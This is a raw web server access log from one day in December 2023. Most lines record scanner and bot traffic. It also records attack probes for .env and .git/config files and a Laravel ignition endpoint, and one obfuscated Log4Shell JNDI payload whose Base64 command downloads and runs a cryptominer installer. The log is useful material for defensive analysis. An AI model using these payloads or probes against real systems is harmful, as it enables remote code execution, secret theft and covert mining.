45.33.87.154 - - [25/Dec/2023:08:58:02 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.251 - - [25/Dec/2023:09:02:40 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
36.67.44.111 - - [25/Dec/2023:09:04:51 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
198.74.56.46 - - [25/Dec/2023:09:04:59 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.118 - - [25/Dec/2023:09:05:11 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.94.146.60 - - [25/Dec/2023:09:25:54 +0000] "GET / HTTP/1.1" 200 3230 "-" "-"
167.94.146.60 - - [25/Dec/2023:09:25:57 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.60 - - [25/Dec/2023:09:25:57 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.60 - - [25/Dec/2023:09:25:57 +0000] "GET /logo192.png HTTP/1.1" 200 5347 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
54.37.79.75 - - [25/Dec/2023:09:28:30 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [25/Dec/2023:09:28:30 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.74.56.46 - - [25/Dec/2023:09:32:28 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [25/Dec/2023:09:32:47 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
68.69.186.30 - - [25/Dec/2023:09:35:07 +0000] "GET / HTTP/1.1" 200 3230 "-" "-"
45.33.87.154 - - [25/Dec/2023:09:48:11 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.223 - - [25/Dec/2023:09:48:56 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.155.88.231 - - [25/Dec/2023:09:53:25 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [25/Dec/2023:09:53:47 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
34.168.233.95 - - [25/Dec/2023:09:54:58 +0000] "OPTIONS / HTTP/1.0" 200 8 "-" "-"
45.79.163.53 - - [25/Dec/2023:09:58:08 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [25/Dec/2023:09:58:23 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
47.236.111.119 - - [25/Dec/2023:10:32:55 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
52.144.45.49 - - [25/Dec/2023:10:43:13 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
52.144.45.49 - - [25/Dec/2023:10:43:13 +0000] "GET //.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
52.144.45.49 - - [25/Dec/2023:10:43:14 +0000] "GET / HTTP/1.1" 200 3230 "-" "python-requests/2.21.0"
52.144.45.49 - - [25/Dec/2023:10:43:14 +0000] "POST / HTTP/1.1" 404 140 "-" "python-requests/2.21.0"
52.144.45.49 - - [25/Dec/2023:10:43:14 +0000] "PUT / HTTP/1.1" 404 139 "-" "python-requests/2.21.0"
52.144.45.49 - - [25/Dec/2023:10:43:14 +0000] "DELETE / HTTP/1.1" 404 142 "-" "python-requests/2.21.0"
52.144.45.49 - - [25/Dec/2023:10:43:14 +0000] "PATCH / HTTP/1.1" 404 141 "-" "python-requests/2.21.0"
52.144.45.49 - - [25/Dec/2023:10:43:15 +0000] "POST //_ignition/execute-solution HTTP/1.1" 404 167 "-" "python-requests/2.21.0"
162.142.125.212 - - [25/Dec/2023:10:51:38 +0000] "GET / HTTP/1.1" 200 3230 "-" "-"
162.142.125.212 - - [25/Dec/2023:10:51:41 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.212 - - [25/Dec/2023:10:51:42 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.212 - - [25/Dec/2023:10:51:42 +0000] "GET /logo192.png HTTP/1.1" 200 5347 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
90.151.171.106 - - [25/Dec/2023:11:01:15 +0000] "GET http://fingerprints.bablosoft.com/ip?Z71886550850Q1 HTTP/1.1" 200 3230 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
198.74.56.46 - - [25/Dec/2023:11:26:08 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [25/Dec/2023:11:26:23 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.163.53 - - [25/Dec/2023:11:27:55 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
162.243.143.11 - - [25/Dec/2023:11:27:59 +0000] "GET /actuator/health HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [25/Dec/2023:11:28:16 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:11:35:44 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:11:35:44 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.224.128.191 - - [25/Dec/2023:11:51:08 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.102.61.10 - - [25/Dec/2023:11:52:40 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
45.90.13.251 - - [25/Dec/2023:12:41:02 +0000] "GET / HTTP/1.0" - - "-" "-"
45.90.13.251 - - [25/Dec/2023:12:41:03 +0000] "GET / HTTP/1.1" 200 3230 "-" "fDXWoW2nHZ0GNNk"
45.90.13.251 - - [25/Dec/2023:12:41:05 +0000] "GET / HTTP/1.1" 200 3230 "-" "9SkjS8cx7EU3Cyf"
45.90.13.251 - - [25/Dec/2023:12:41:06 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "LU8fcXjDoVVljQz"
45.90.13.251 - - [25/Dec/2023:12:41:07 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "bVLspaRH4UoLS5i"
45.90.13.251 - - [25/Dec/2023:12:41:08 +0000] "HEAD / HTTP/1.1" 200 3230 "-" "zwXexRNa7dVEz7n"
45.90.13.251 - - [25/Dec/2023:12:41:08 +0000] "DELETE / HTTP/1.1" 404 142 "-" "xOm4gIgGgz0qwXw"
139.59.101.104 - - [25/Dec/2023:12:44:06 +0000] "GET /cdn-cgi/trace HTTP/1.1" 200 3230 "-" "Mozilla/5.0"
45.79.168.172 - - [25/Dec/2023:13:06:48 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [25/Dec/2023:13:06:58 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.33.87.154 - - [25/Dec/2023:13:10:23 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.13 - - [25/Dec/2023:13:10:57 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
90.151.171.106 - - [25/Dec/2023:14:08:47 +0000] "GET http://check.best-proxies.ru/ip.php?Z71886550850Q1 HTTP/1.1" 200 3230 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
45.79.163.53 - - [25/Dec/2023:14:31:17 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [25/Dec/2023:14:31:36 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:14:33:54 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:14:33:58 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
147.182.140.185 - - [25/Dec/2023:14:52:58 +0000] "POST /api/v0/id HTTP/1.1" 404 149 "-" "xxx"
68.69.186.30 - - [25/Dec/2023:14:55:59 +0000] "GET / HTTP/1.1" 200 3230 "-" "-"
95.214.53.103 - - [25/Dec/2023:14:58:34 +0000] "GET / HTTP/1.1" 200 3230 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//cdn.x4b.lol:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//cdn.x4b.lol:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}')"
69.164.217.74 - - [25/Dec/2023:15:23:54 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [25/Dec/2023:15:24:16 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
139.59.101.104 - - [25/Dec/2023:15:25:44 +0000] "GET /cdn-cgi/trace HTTP/1.1" 200 3230 "-" "Mozilla/5.0"
23.153.248.33 - - [25/Dec/2023:15:40:42 +0000] "GET / HTTP/1.0" - - "-" "-"
92.205.185.52 - - [25/Dec/2023:15:40:43 +0000] "GET / HTTP/1.1" 200 3230 "-" "AsKW00EIh4itX2B"
107.189.13.254 - - [25/Dec/2023:15:41:15 +0000] "GET / HTTP/1.1" 200 3230 "-" "IBld1wxeicXsTFM"
107.189.13.254 - - [25/Dec/2023:15:41:16 +0000] "GET / HTTP/1.1" 200 3230 "-" "a27RMUXwW2w80FE"
107.189.13.254 - - [25/Dec/2023:15:41:17 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "ajz8ym1en8raj5f"
107.189.13.254 - - [25/Dec/2023:15:41:17 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "SU2Tp7SFct4SFm6"
107.189.13.254 - - [25/Dec/2023:15:41:18 +0000] "HEAD / HTTP/1.1" 200 3230 "-" "V4NZgfVMO4WNkGq"
107.189.13.254 - - [25/Dec/2023:15:41:19 +0000] "DELETE / HTTP/1.1" 404 142 "-" "N7HEP5EqvwqIkLh"
71.6.167.142 - - [25/Dec/2023:15:45:42 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
71.6.167.142 - - [25/Dec/2023:15:45:43 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "-"
71.6.167.142 - - [25/Dec/2023:15:45:44 +0000] "GET /sitemap.xml HTTP/1.1" 200 3230 "-" "-"
71.6.167.142 - - [25/Dec/2023:15:45:44 +0000] "GET /.well-known/security.txt HTTP/1.1" 200 3230 "-" "-"
71.6.167.142 - - [25/Dec/2023:15:45:47 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
45.33.87.154 - - [25/Dec/2023:15:49:05 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.223 - - [25/Dec/2023:15:51:01 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
69.164.217.245 - - [25/Dec/2023:16:02:40 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.13 - - [25/Dec/2023:16:03:14 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.33.87.154 - - [25/Dec/2023:16:04:56 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.11 - - [25/Dec/2023:16:05:22 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
179.106.100.24 - - [25/Dec/2023:16:37:42 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
90.151.171.106 - - [25/Dec/2023:16:39:00 +0000] "GET http://api.ipify.org?Z71886550850Q1 HTTP/1.1" 200 3230 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
51.254.59.113 - - [25/Dec/2023:16:45:36 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
66.240.236.116 - - [25/Dec/2023:16:55:55 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
167.71.217.61 - - [25/Dec/2023:17:11:14 +0000] "GET /cdn-cgi/trace HTTP/1.1" 200 3230 "-" "Mozilla/5.0"
95.214.235.169 - - [25/Dec/2023:17:23:34 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:17:23:36 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
69.164.217.74 - - [25/Dec/2023:17:25:42 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.179 - - [25/Dec/2023:17:26:01 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
69.164.217.74 - - [25/Dec/2023:17:27:15 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [25/Dec/2023:17:27:32 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
178.151.152.84 - - [25/Dec/2023:17:35:58 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.79.168.172 - - [25/Dec/2023:18:11:32 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.46 - - [25/Dec/2023:18:12:01 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
79.13.248.116 - - [25/Dec/2023:18:43:54 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [25/Dec/2023:18:43:54 +0000] "GET /static/js/2.f5e8e300.chunk.js HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [25/Dec/2023:18:43:54 +0000] "GET /static/css/main.b1d60193.chunk.css HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [25/Dec/2023:18:43:54 +0000] "GET /static/js/main.e4532f1e.chunk.js HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [25/Dec/2023:18:43:54 +0000] "GET /logo2.jpeg HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [25/Dec/2023:18:43:54 +0000] "GET /api/sessions/current HTTP/1.1" 401 37 "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [25/Dec/2023:18:43:54 +0000] "GET /api/memes HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
104.244.77.79 - - [25/Dec/2023:18:44:36 +0000] "GET / HTTP/1.0" - - "-" "-"
45.66.35.10 - - [25/Dec/2023:18:44:48 +0000] "GET / HTTP/1.1" 200 3230 "-" "u16cxLruxkj4Vut"
45.66.35.10 - - [25/Dec/2023:18:44:54 +0000] "GET / HTTP/1.1" 200 3230 "-" "PdrzdJQyEoQg9KW"
185.241.208.206 - - [25/Dec/2023:18:45:33 +0000] "GET / HTTP/1.1" 200 3230 "-" "8WSrFaXwNSkNgWW"
198.50.207.20 - - [25/Dec/2023:18:45:42 +0000] "GET / HTTP/1.1" 200 3230 "-" "nELCPFVKFoOhqXe"
198.50.207.20 - - [25/Dec/2023:18:45:44 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "GvUTcJMxlr0CpAw"
198.50.207.20 - - [25/Dec/2023:18:45:45 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "87Q8gz3XWTcjmx9"
172.233.227.17 - - [25/Dec/2023:18:47:20 +0000] "GET / HTTP/1.1" 200 3230 "-" "csO53V48duofeln"
172.233.227.17 - - [25/Dec/2023:18:47:23 +0000] "GET / HTTP/1.1" 200 3230 "-" "vtJSfzwvxavtJw4"
172.233.227.17 - - [25/Dec/2023:18:47:24 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "3NBjwYoWX2hc633"
185.241.208.232 - - [25/Dec/2023:18:47:25 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "94MTBxBiU1ruCtz"
185.241.208.232 - - [25/Dec/2023:18:47:26 +0000] "HEAD / HTTP/1.1" 200 3230 "-" "Kz0z1rutKGNjiIk"
185.241.208.232 - - [25/Dec/2023:18:47:27 +0000] "DELETE / HTTP/1.1" 404 142 "-" "AwcTHo8uI1rW0Il"
192.241.225.71 - - [25/Dec/2023:18:57:03 +0000] "GET /portal/redlion HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
84.126.180.66 - - [25/Dec/2023:19:02:33 +0000] "GET / HTTP/1.0" 200 3230 "-" "-"
80.79.117.42 - - [25/Dec/2023:19:24:13 +0000] "GET / HTTP/1.0" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
45.79.163.53 - - [25/Dec/2023:19:50:59 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [25/Dec/2023:19:51:23 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
34.76.96.55 - - [25/Dec/2023:19:51:34 +0000] "GET / HTTP/1.1" 200 3230 "-" "python-requests/2.31.0"
90.151.171.106 - - [25/Dec/2023:20:05:55 +0000] "GET http://ip.bablosoft.com/?Z71886550850Q1 HTTP/1.1" 200 3230 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
95.214.235.169 - - [25/Dec/2023:20:15:59 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:20:16:00 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
69.164.217.245 - - [25/Dec/2023:20:21:44 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.179 - - [25/Dec/2023:20:21:54 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
69.164.217.74 - - [25/Dec/2023:20:25:35 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [25/Dec/2023:20:26:07 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
20.84.105.10 - - [25/Dec/2023:21:06:55 +0000] "GET /.git/config HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
172.104.210.105 - - [25/Dec/2023:21:17:00 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [25/Dec/2023:21:17:29 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
198.74.56.46 - - [25/Dec/2023:21:56:17 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.223 - - [25/Dec/2023:21:56:38 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
91.92.243.232 - - [25/Dec/2023:22:21:51 +0000] "GET / HTTP/1.1" 200 3230 "-" "-"
167.248.133.52 - - [25/Dec/2023:22:37:05 +0000] "GET / HTTP/1.1" 200 3230 "-" "-"
167.248.133.52 - - [25/Dec/2023:22:37:09 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.52 - - [25/Dec/2023:22:37:10 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.52 - - [25/Dec/2023:22:37:10 +0000] "GET /logo192.png HTTP/1.1" 200 5347 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
198.50.207.20 - - [25/Dec/2023:22:42:55 +0000] "GET / HTTP/1.0" - - "-" "-"
104.244.72.115 - - [25/Dec/2023:22:44:09 +0000] "GET / HTTP/1.1" 200 3230 "-" "dtmy9cEMd6aCUlm"
107.189.8.5 - - [25/Dec/2023:22:44:10 +0000] "GET / HTTP/1.1" 200 3230 "-" "7RigwiSmuA57Z6o"
169.150.196.4 - - [25/Dec/2023:22:44:50 +0000] "GET / HTTP/1.1" 200 3230 "-" "Kf5Flp7Uri2s8a7"
204.8.156.142 - - [25/Dec/2023:22:45:44 +0000] "GET / HTTP/1.1" 200 3230 "-" "cl65tPu3e6ES8dB"
82.221.131.71 - - [25/Dec/2023:22:46:03 +0000] "GET / HTTP/1.1" 200 3230 "-" "o3rAxL5hlQVJE05"
185.207.107.216 - - [25/Dec/2023:22:46:11 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "CXQdc2QMjnOPdrJ"
94.16.116.81 - - [25/Dec/2023:22:46:14 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "AiLAh4NFujjEr2N"
75.119.142.240 - - [25/Dec/2023:22:46:15 +0000] "HEAD / HTTP/1.1" 200 3230 "-" "NrsA5dj0UKhgIcq"
92.205.163.226 - - [25/Dec/2023:22:46:16 +0000] "DELETE / HTTP/1.1" 404 142 "-" "ZQ9ovEZKRDgZKO4"
